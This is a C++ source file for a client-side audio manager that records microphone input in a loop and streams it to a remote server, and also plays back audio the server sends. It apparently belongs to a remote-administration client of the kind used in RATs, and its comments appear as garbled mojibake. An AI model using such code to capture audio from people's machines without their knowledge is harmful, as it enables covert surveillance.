#include "ClientAudioManager.h"
#include "Common.h"


CClientAudioManager::CClientAudioManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	m_IsLoop = FALSE;
	m_Audio = NULL;

	if (OnInitMember() == FALSE)
	{
		return;
	}

	BYTE	IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	WaitForServerDialogOpen();    //�ȴ��Ի����



	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReceiveProcedure,
		(LPVOID)this, 0, NULL);
}
BOOL CClientAudioManager::OnInitMember()
{
	if (!waveInGetNumDevs())   //��ȡ���������豸����Ŀ ʵ�ʾ��ǿ�����û������
	{
		return FALSE;
	}


	if (m_IsLoop == TRUE)
	{
		return FALSE;
	}

	m_Audio = new CAudio;  //���������������ڴ�

	m_IsLoop = TRUE;
	return TRUE;
}
DWORD CClientAudioManager::ReceiveProcedure(LPVOID ParameterData)   //���������������
{
	CClientAudioManager* This = (CClientAudioManager*)ParameterData;
	while (This->m_IsLoop)
	{
		This->SendRecordData();
	}
	printf("CClientAudioManager::ReceiveProcedure() �˳�\r\n");
	return 0;
}

int CClientAudioManager::SendRecordData()
{
	DWORD	BufferLength = 0;
	DWORD	ReturnLength = 0;
	//����õ���Ƶ����
	LPBYTE	v1 = m_Audio->GetRecordData(&BufferLength);
	if (v1 == NULL)
	{
		return 0;
	}
	//���仺����
	LPBYTE	BufferData = new BYTE[BufferLength + 1];
	//��������ͷ
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;     //�����ض˷��͸���Ϣ
	//���ƻ�����
	memcpy(BufferData + 1, v1, BufferLength);
	//���ͳ�ȥ
	if (BufferLength > 0)
	{
		ReturnLength = m_ClientObject->OnServerSending((char*)BufferData, BufferLength + 1);
	}
	if (BufferData != NULL)
	{
		delete	BufferData;
		BufferData = NULL;
	}

	return ReturnLength;
}


CClientAudioManager::~CClientAudioManager()
{

	m_IsLoop = FALSE;                                  //�趨����״̬Ϊ��
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);    //�ȴ� �����߳̽���


	if (m_Audio != NULL)
	{
		delete m_Audio;
		m_Audio = NULL;
	}
}
void CClientAudioManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
	{

		m_Audio->PlayRecordData(BufferData, BufferLength);
		break;
	}
	}
}
